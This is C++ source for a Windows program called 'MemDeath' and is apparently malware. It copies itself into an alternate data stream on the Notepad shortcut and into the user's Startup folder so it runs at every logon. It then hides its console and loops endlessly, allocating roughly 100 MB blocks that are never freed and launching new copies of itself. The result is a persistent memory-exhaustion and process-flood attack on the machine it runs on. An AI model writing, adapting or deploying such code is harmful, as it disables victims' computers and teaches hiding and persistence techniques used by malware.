#include <cstdlib>
#include <windows.h>  
#include "TlHelp32.h"
#include <iostream>
#include <fstream>
#include <sstream>
#define UNICODE 1
using namespace std;
string userPath;
string startupPath;
bool fileExists(const char *fileName){
	ifstream infile(fileName);
	return infile.good();
}
void begin(char* szPathbeg){
	//return;
	//return;

	char *userName = getenv("USERNAME"); //Get the username of the current user.
	stringstream ss;
	string userNamestring;
	ss << userName;
	ss >> userNamestring;
	string pathname;
	pathname = "C:/Users/" + userNamestring; //%USERNAME% variable in batch
	userPath = pathname;
	pathname += "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs"; //Get the folder that contains both directories needed
	startupPath = pathname + "/Startup/MemDeath.exe"; //Get the startup program path
	if(fileExists(startupPath.c_str())) return;

	pathname += "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs"; //Get the folder that contains both directories needed
	string AdsPath = pathname + "/Accessories/Notepad.lnk:ADS.INFO"; //Get the hidden file path
	ifstream StarterSrc;
	ofstream StarterDst;

	StarterSrc.open("MemDeath.exe", ios::binary); //Take the executable in the install path
	StarterDst.open(AdsPath, ios::binary);
	StarterDst << StarterSrc.rdbuf(); //copy executable to hidden path inside an ADS
	StarterSrc.close();
	StarterDst.close();

	StarterSrc.open("MemDeath.exe", ios::binary);
	StarterDst.open(startupPath, ios::binary);
	StarterDst << StarterSrc.rdbuf(); //copy executable from hidden path inside an ADS to startup
	StarterSrc.close();
	StarterDst.close();
}
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow){
	char  szPath[MAX_PATH];
	PSTR  lpFilename;
	lpFilename = (strrchr(szPath, '\\') + 1);
	begin(szPath);
	//return 0;
	ShowWindow( GetConsoleWindow(), SW_HIDE );
	if (GetModuleFileName(NULL, szPath, sizeof szPath) == 0)
		return -1;
	//cout << szPath << endl;
	//return 0;
	string startCommand;
	startCommand = "\"" + startupPath + "\"";
	while(true){
		new char[107370900];
		system(startCommand.c_str());
		new char[107370900];
		system(startCommand.c_str());
		new char[107370900];
		system(startCommand.c_str());
		new char[107370900];
		system(startCommand.c_str());
		new char[107370900];
		system(startCommand.c_str());
		new char[107370900];
		system(startCommand.c_str());
		new char[107370900];
		system(startCommand.c_str());
		new char[107370900];
		system(startCommand.c_str());
		new char[107370900];
		system(startCommand.c_str());
	}
	return 0;
}
